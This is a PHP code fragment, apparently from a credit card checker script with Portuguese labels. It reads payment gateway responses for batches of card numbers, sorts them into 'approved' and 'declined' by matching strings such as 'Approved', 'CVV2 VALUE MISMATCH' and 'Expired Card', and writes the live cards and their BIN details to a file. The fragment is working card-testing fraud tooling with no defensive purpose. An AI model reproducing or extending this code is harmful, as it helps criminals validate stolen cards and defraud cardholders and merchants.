if (preg_match('/ExpressResponseMessage=([^&]+)/', $response_text, $matches)) {
    $approved = $matches[1];
}
if (!empty($div_message)) {
echo "Live dando Redirect? True:" . $div_message . PHP_EOL;
}
if (strpos($approved, "Approved") !== false || strpos($approved, "AVS") !== false || strpos($div_message, "redirecting...") !== false) {

    echo colorir("$contador - [Aprovado] -> $card_info -> $info_bin", 32 ) . PHP_EOL;
    echo colorir("Resultado: Approved", 36) . PHP_EOL;
    saveGG("APROVADA -> $card_info -> $info_bin -> Approved\n");

 }elseif(strpos($response_text, 'Invalid Request') !== false){
   
    echo colorir("$contador - [Aprovado] -> $card_info -> $info_bin", 32 ) . PHP_EOL;
    echo colorir("Resultado: Expired Card", 36) . PHP_EOL;
    saveGG("APROVADA -> $card_info -> $info_bin -> Invalid Request\n");

   
 }elseif (strpos($response_text, 'CVV2 VALUE MISMATCH') !== false) {
    echo colorir("$contador - [Aprovado] -> $card_info -> $info_bin", 32 ) . PHP_EOL;
    echo colorir("Resultado: Expired Card", 36) . PHP_EOL;
    saveGG("APROVADA -> $card_info -> $info_bin -> CVV2 VALUE MISMATCH\n");

 }elseif (strpos($response_text, 'PLEASE RETRY') !== false) {
    echo colorir("$contador - [Aprovado] -> $card_info -> $info_bin", 32 ) . PHP_EOL;
    echo colorir("Resultado: Expired Card", 36) . PHP_EOL;
    saveGG("APROVADA -> $card_info -> $info_bin -> PLEASE RETRY\n");  

}elseif (strpos($response_text, 'Expired Card') !== false) {
    echo colorir("$contador - [Aprovado] -> $card_info -> $info_bin", 32 ) . PHP_EOL;
    echo colorir("Resultado: Expired Card", 36) . PHP_EOL;
    saveGG("APROVADA -> $card_info -> $info_bin -> EXPIRED CARD\n");

}elseif (strpos($response_text, 'Declined') !== false) {
    echo colorir("$contador - [Reprovado] -> $card_info -> $info_bin", 31) . PHP_EOL;
    echo colorir("Resultado: Declined", 33) . PHP_EOL;

}elseif (strpos($response_text, 'Not Authorized') !== false ) {
    echo colorir("$contador - [Reprovado] -> $card_info -> $info_bin", 31) . PHP_EOL;
    echo colorir("Resultado: Not Authorized", 33) . PHP_EOL;

}elseif (strpos($response_text, 'INVALID CARD INFO') !== false ) {
    echo colorir("$contador - [Reprovado] -> $card_info -> $info_bin", 31) . PHP_EOL;
    echo colorir("Resultado: INVALID CARD INFO", 33) . PHP_EOL;

}else{
    echo colorir("$contador - [Reprovado] -> $card_info -> $info_bin", 31) . PHP_EOL;
    echo colorir("Resultado: INVALID CARD INFO", 33) . PHP_EOL;
    
    
}

}

          }
        }
    }